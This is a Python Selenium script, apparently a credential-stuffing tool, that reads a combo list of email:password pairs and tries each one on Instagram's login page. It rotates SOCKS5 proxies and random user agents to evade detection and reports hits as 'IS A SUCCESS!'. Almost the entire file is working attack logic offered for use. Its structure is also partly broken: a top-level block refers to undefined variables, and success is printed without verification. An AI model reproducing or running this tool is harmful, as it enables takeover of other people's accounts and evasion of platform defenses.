import time
from random import seed
from random import randint
import os
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.proxy import Proxy, ProxyType
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from fake_useragent import UserAgent


socks = []

socks_4f = input("What is the Socks file?(N: FOR NO SOCKS)")
if socks_4f != 'N':
    socks_4f = open(socks_4f, 'r')

for line in socks_4f:
    socks.append(line)
print("\n SOCKS ADDED\n")
m = 0


class InstaBot:
    def __init__(self, username, password, i, socks_4f, socks_proxy):
        try:
            if socks_4f != 'N':
                options = Options()
                options.add_argument('--proxy-server=socks5://{}'.format(socks_proxy.strip()))
                options.add_argument("start-maximized")
                ua = UserAgent()
                user_agent = ua.random
                options.add_argument(f'user-agent={user_agent}')
                driver = webdriver.Chrome( "/home/robert/Desktop/chromedriver",chrome_options = options)
                driver.implicitly_wait(0.6)
                driver.get(
                    "https://www.instagram.com/accounts/login")
                time.sleep(getRandomTime())
                driver.implicitly_wait(10)
                driver.find_element_by_xpath(
                    "//input[@name=\"username\"]").send_keys(username)
                driver.find_element_by_xpath(
                    "//input[@name=\"password\"]").send_keys(password)

                driver.find_element_by_xpath(
                    '//button[@type="submit"]').click()

            if socks_4f == 'N':
                driver = webdriver.Chrome(
                    "/home/robert/Desktop/chromedriver")
                driver.implicitly_wait(0.6)
                driver.get("https://www.instagram.com/accounts/login/")
                time.sleep(getRandomTime())
                driver.find_element_by_xpath(
                    "//input[@name=\"username\"]").send_keys(username)
                driver.find_element_by_xpath(
                    "//input[@name=\"password\"]").send_keys(password)

                time.sleep(getRandomTime())
                driver.find_element_by_xpath(
                    '//button[@type="submit"]').click()
        except Exception:
            print("Possible Proxy Error")


try:
    time.sleep(getRandomTime())
    print(username, ":", password, "IS A SUCCESS!")
    driver.find_element_by_xpath(
        "//button[contains(text(), 'Not Now')]").click()

    time.sleep(getRandomTime())

    driver.quit()

except Exception:
    print("STARTING")


def getRandomTime():
    randTime = randint(3, 5)
    return randTime


r_file = input("What is the combo list in [Email:Pass] format?>")
r_file = open(r_file)
i = 0
for line in r_file:
    newest = line.split(":")
    User = line.split(":")[0]
    Password = line.split(":")[1]
    print("\nCOMBO: ", User, ":", Password)
    if socks_4f != 'N':
        socks_proxy = str(socks[i])
        InstaBot(User, Password, i, socks_4f, socks_proxy)
        print("\nSOCKS: " + socks_proxy)
    if socks_4f == 'N':
        socks_proxy = str(socks)
        InstaBot(User, Password, i, socks_4f, socks_proxy)
    print("\n<Error Wrong Login>")
    if socks_4f != 'N':
        if i == len(socks) - 1:
            print("Recycling Socks")
            i -= len(socks)
    i += 1
